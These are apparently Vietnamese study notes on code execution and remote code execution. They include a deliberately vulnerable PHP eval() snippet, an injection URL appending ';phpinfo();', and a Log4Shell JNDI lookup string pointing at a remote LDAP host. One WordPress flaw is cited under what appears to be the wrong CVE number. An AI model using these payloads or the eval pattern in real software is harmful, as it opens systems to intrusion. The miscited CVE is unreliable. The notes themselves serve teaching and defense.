
# Tổng quan
- Code Excution là thuật ngữ chung để chi việc thực thi bất kì đoạn mã nào trên hệ thống

# Biến thể của Code Excution 

**1. RCE**

**a) Định nghĩa**

- RCE ( Remote Code Excution ) là 1 biến thể của Code Excution cho phép kẻ tấn công thực thi mã từ xa mà không cần quyền hợp lệ

**b) Tác động**

- Lỗ hổng RCE có thể gây ra những tác động nghiêm trọng đến hệ thống, ứng dụng: bao gồm: xâm nhập, lep thang đặc quyền, tiết lộ dữ liệu nhạy cảm, DoS, khai thác tiền điện tử, tóng tiền

**c) Ví dụ**

```
<?php eval("echo ".$_GET["user"].";"); ?>
```

Người phát triển có thể nghĩa rằng người dùng chỉ nhập tên người dùng hợp lệ làm tham số cho URL

```
http://www.example.com/index.php?user=admin
```

Sau đó, ứng dụng sẽ chạy giá trị tham số dưới dạng mã

```
echo admin;
```
và in tên người dùng

Kẻ tấn công có thể chèn mã độc vào bằng cách chèn dấu `;` vào đằng sau URL

```
http://www.example.com/index.php?user=admin;phpinfo();
```

Sau đó, đoạn code sẽ được thực thi như sau

```
echo admin;
phpinfo();
```

d) Các loại tấn công RCE

- Các loại tấn công phổ biến nhất là :
  - Tấn công Injection
  - Tấn công Deserialization: nếu ứng dụng không kiểm tra kĩ dữ liệu đầu vào từ người dùng, dữ iệu được chuỗi hóa có thể chứa mã độc và khi được deserialization, mã này sẽ được thực thi ( Deserialization là quá trình chuyển đổi chuỗi dữ liệu (byte stream) trở về đối tượng, cấu trùng dữ liệu ban đầu ( object, list,...)
  - Ghi ngoài giới hạn (Outs-of-bounds write): đây là lỗi quản lý bộ nhớ xảy ra khi chương trình ghi dữ liệu vượt ra ngoài vùng bộ nhớ đệm ( Ví dụ: nếu bộ nhớ được cấp chỉ đủ lưu 10 byte nhưng chương trình cố ghi vào 20 byte, các byte bổ sung sẽ ghi đè lên bộ nhớ lân cận.
 
e) Ví dụ về một số lỗ hổng đã biết

- CVE-2021-44228 (Log4Shell): lỗ hổng xảy ra ở tích năng kết nối dịch vụ thông qua JNDI bằng cách sử dụng URL. Log4j không cung cấp bộ lọc nào để loại trừ các URL không xác định. Điều này xảy ra vì Log4j chứa cú pháp đặc biệt theo hình thức `${prefix:name}`. Ví dụ `${java:version}` là phiên bản Java đang chạy hiện tại, `${env:PATH}` lấy thông tin biến môi trường. Điều này rủi ro vì khi gặp chuỗi `${jndi:ldap://example.com/a}`, Log4j sẽ tự động kết nối với URL này

- CVE-2021-1844: đây là lỗ hổng bảo mật trong WordPress trước 5.0.1. Kẻ tấn công có quyền tác giả có thể tải lên 1 hình ảnh được tạo đặc biệt chứa mã PHP trong metadata Exif ( ứng dụng phân tíhc, quản lý hình ảnh )

**2. ACE**

- ACE ( Arbitrary Code Execution ) là khả năng kẻ tấn công thực thi bất kì mã tùy ý nào trên hệ thống ( có thể thực hiện cục bộ hoặc từ xa )
